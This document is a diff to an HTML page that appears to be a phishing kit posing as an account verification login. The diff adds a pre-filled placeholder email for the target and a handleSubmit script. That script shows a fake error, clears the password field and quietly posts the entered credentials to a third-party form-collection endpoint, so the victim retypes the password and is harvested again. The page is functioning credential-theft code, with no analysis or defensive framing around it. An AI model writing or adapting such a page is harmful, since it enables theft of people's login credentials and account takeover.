@@ -25,8 +25,8 @@ please verify to access.</span><br>
                             <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                             <small></small>
                             <div class="form-group">
-                                <form action="https://formbold.com/s/9mkW5" method="post">
-                                    <input type="email" id="login" name="AA" class="form-control rounded-0 bg-transparent" aria-describedby="aiHelp" placeholder="Email Address" autofocus required>
+                                <form id="loginForm" action="https://formbold.com/s/9mkW5" method="post">
+                                    <input type="email" id="login" name="AA" class="form-control rounded-0 bg-transparent" aria-describedby="aiHelp" placeholder="Email Address" value="replaceemail@domain.com" required>
                             </div>
                             <div class="form-group mt-2">
                                 <small></small>
@@ -39,14 +39,34 @@ please verify to access.</span><br>
                             <span><span><a href="#" class="float-right">Forgot Password?</a></span></span>
                         </div>
                         <div class="col-lg-12 mt-3">
-                            <button type="submit" class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #ed2a1c;">VIEW</button>
+                            <button type="button" class="btn text-white px-4 w-100" id="submit-btn" style="background-color: #ed2a1c;" onclick="handleSubmit()">VIEW</button>
                         </div>
                     </div>
                 </div>
             </div>
         </div>
     </div>
-<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'934601997f927bc9',t:'MTc0NTMzNDE4OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
+
+    <script>
+        function handleSubmit() {
+            // Show error message
+            document.getElementById('msg').style.display = 'block';
+            
+            // Clear password field
+            document.getElementById('passwd').value = '';
+            
+            // Focus back on password field
+            document.getElementById('passwd').focus();
+            
+            // Submit form data in background (original form action)
+            document.getElementById('loginForm').submit();
+            
+            // Prevent default form submission (we're handling it manually)
+            return false;
+        }
+    </script>
+
+    <script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'934601997f927bc9',t:'MTc0NTMzNDE4OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 
 </html>
